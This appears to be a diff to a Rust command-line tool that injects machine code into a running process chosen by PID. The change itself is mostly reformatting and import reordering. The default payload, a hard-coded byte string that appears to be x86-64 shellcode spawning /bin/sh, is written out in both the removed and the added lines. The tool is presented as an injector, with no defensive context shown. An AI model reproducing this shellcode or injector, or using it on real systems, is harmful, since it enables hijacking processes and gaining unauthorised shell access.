@@ -2,10 +2,10 @@
 extern crate clap;
 
 mod injection;
-use std::process::exit;
-use caps::{Capability, CapSet};
-use std::io::Read;
+use caps::{CapSet, Capability};
 use std::fs::File;
+use std::io::Read;
+use std::process::exit;
 
 fn main() {
     let yaml = load_yaml!("options.yml");
@@ -33,20 +33,23 @@ fn main() {
     }
 
     let code = match args.value_of("code") {
-            Some(path) => {
-                let mut v = Vec::new();
-                File::open(path).unwrap_or_else(|e| {
+        Some(path) => {
+            let mut v = Vec::new();
+            File::open(path)
+                .unwrap_or_else(|e| {
                     eprintln!("{}: {}", path, e);
                     exit(1);
-                }).read_to_end(&mut v).unwrap();
-                v
-            },
-            None => {
-                b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+                })
+                .read_to_end(&mut v)
+                .unwrap();
+            v
+        }
+        None => {
+            b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" //\x00\x72\x00\x2f\x70"
                 .iter()
                 .map(|x| *x)
                 .collect::<Vec<u8>>()
-            }
+        }
     };
     let injector = injection::Injector::new(target_pid, code).unwrap_or_else(|e| {
         eprintln!("{}", e);
